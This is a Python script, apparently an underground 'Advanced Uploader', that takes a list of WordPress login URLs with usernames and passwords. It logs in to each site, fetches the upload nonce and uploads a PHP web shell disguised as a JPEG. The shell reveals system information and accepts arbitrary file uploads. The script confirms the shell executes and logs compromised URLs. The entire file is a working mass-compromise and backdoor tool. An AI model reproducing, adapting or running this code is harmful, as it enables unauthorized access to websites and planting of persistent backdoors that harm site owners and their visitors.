import sys
import requests
import os
from colorama import Fore, Style, init
import re

init(autoreset=True)

# Define colors for styled output
fg = Fore.GREEN
fr = Fore.RED
sb = Style.BRIGHT

# Custom PHP redirect file content
php_redirect_code = """<?php
// Small image data to pass file type checks
$image_data = base64_decode('/9j/4AAQSkZJRgABAQEAYABgAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRofHh0aHBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/2wBDAQkJCQwLDBgNDRgyIRwhMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjL/wAARCAABAAEDASIAAhEBAxEB/8QAHwAAAQUBAQEBAQEAAAAAAAAAAAECAwQFBgcICQoL/8QAtRAAAgEDAwIEAwUFBAQAAAF9AQIDAAQRBRIhMUEGE1FhByJxFDKBkaEII0KxwRVS0fAkM2JyggkKFhcYGRolJicoKSo0NTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uHi4+Tl5ufo6erx8vP09fb3+Pn6/8QAHwEAAwEBAQEBAQEBAQAAAAAAAAECAwQFBgcICQoL/8QAtREAAgECBAQDBAcFBAQAAQJ3AAECAxEEBSExBhJBUQdhcRMiMoEIFEKRobHBCSMzUvAVYnLRChYkNOEl8RcYGRomJygpKjU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6goOEhYaHiImKkpOUlZaXmJmaoqOkpaanqKmqsrO0tba3uLm6wsPExcbHyMnK0tPU1dbX2Nna4uPk5ebn6Onq8vP09fb3+Pn6/9oADAMBAAIRAxEAPwD3+iiigD//2Q==');
echo $image_data;
// Start of actual PHP code
header("Content-Type: text/plain");
echo "OK\\n";
echo php_uname() . "\\n";
echo "{ Uploader By : @Capitosx }\\n";
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_FILES['__']) && move_uploaded_file($_FILES['__']['tmp_name'], $_FILES['__']['name'])) {
        echo "Uploaded [✔️]\\n";
    } else {
        echo "Not Uploaded [❌]\\n";
    }
}
?>"""

# Print intro message
print("{}{} Advanced Uploader - Media Upload ".format(fg, sb))

# Check if the correct number of arguments is provided
if len(sys.argv) != 2:
    script_name = os.path.basename(sys.argv[0])
    print(f"  [!] Usage: {script_name} <wordpress.txt>\n  Telegram : @Capitosx  Format List (http://domain.com/wp-login.php#username@password)")
else:
    # Get the WordPress login list file
    wp_list_file = sys.argv[1]
    if os.path.isfile(wp_list_file):
        with open(wp_list_file, 'r', encoding='utf-8') as sites:
            for site in sites:
                site = site.strip()

                # Parse login credentials
                if '#' in site:
                    wp_login_url, credentials = site.split('#')
                    username, password = credentials.split('@')

                    print(f"\n[+] Trying {wp_login_url} with {username}:{password}")

                    # Log in to WordPress
                    session = requests.Session()
                    login_data = {
                        'log': username,
                        'pwd': password,
                        'wp-submit': 'Log In',
                        'redirect_to': wp_login_url,
                        'testcookie': 1
                    }

                    # Attempt to log in to WordPress
                    response = session.post(wp_login_url, data=login_data)

                    if "dashboard" in response.text or "wp-admin" in response.text:
                        print(f"{fg}[✔️] Logged in successfully")

                        # Get the media upload page
                        media_upload_url = wp_login_url.replace('wp-login.php', 'wp-admin/media-new.php')
                        upload_page = session.get(media_upload_url)

                        if upload_page.ok:
                            # Extract the nonce
                            nonce_match = re.search(r'name="_wpnonce"\s+value="([^"]+)"', upload_page.text)
                            
                            if nonce_match:
                                nonce = nonce_match.group(1)
                                
                                # Prepare file for upload
                                files = {
                                    'async-upload': ('capitos.jpg', php_redirect_code, 'image/jpeg')
                                }
                                data = {
                                    'name': 'capitos.jpg',
                                    'action': 'upload-attachment',
                                    '_wpnonce': nonce,
                                }

                                # Attempt to upload the file
                                upload_url = wp_login_url.replace('wp-login.php', 'wp-admin/async-upload.php')
                                upload_response = session.post(upload_url, files=files, data=data)

                                if upload_response.ok:
                                    try:
                                        response_data = upload_response.json()
                                        if 'success' in response_data and response_data['success']:
                                            uploaded_file_url = response_data['data']['url']
                                            print(f"{fg}[✔️] File uploaded successfully to {uploaded_file_url}")
                                            
                                            # Check if the uploaded file is accessible and executing correctly
                                            check_response = session.get(uploaded_file_url)
                                            if check_response.ok:
                                                if "OK" in check_response.text and "{ Uploader By : @Capitosx }" in check_response.text:
                                                    print(f"{fg}[✔️] File is accessible and executing correctly")
                                                    print(f"{fg}File content:\n{check_response.text}")
                                                else:
                                                    print(f"{fr}[❌] File is accessible but not executing PHP code")
                                                    print(f"{fr}Debug: File content: {check_response.text}")
                                            else:
                                                print(f"{fr}[❌] Unable to access the uploaded file")
                                                print(f"{fr}Debug: Response status code: {check_response.status_code}")
                                            
                                            # Log the successful upload
                                            with open('Upload_Success.txt', 'a') as success_log:
                                                success_log.write(f"{uploaded_file_url}\n")
                                        else:
                                            print(f"{fr}[❌] Failed to upload file")
                                            print(f"{fr}Debug: Upload response: {upload_response.text}")
                                    except ValueError:
                                        print(f"{fr}[❌] Failed to parse upload response")
                                        print(f"{fr}Debug: Upload response: {upload_response.text}")
                                else:
                                    print(f"{fr}[❌] Upload request failed")
                                    print(f"{fr}Debug: Upload response status code: {upload_response.status_code}")
                            else:
                                print(f"{fr}[❌] Failed to extract nonce for file upload")
                        else:
                            print(f"{fr}[❌] Media upload page not accessible")
                            print(f"{fr}Debug: Media upload page response: {upload_page.text}")
                    else:
                        print(f"{fr}[❌] Login failed for {wp_login_url}")
    else:
        print(f"{fr}[❌] File {wp_list_file} not found")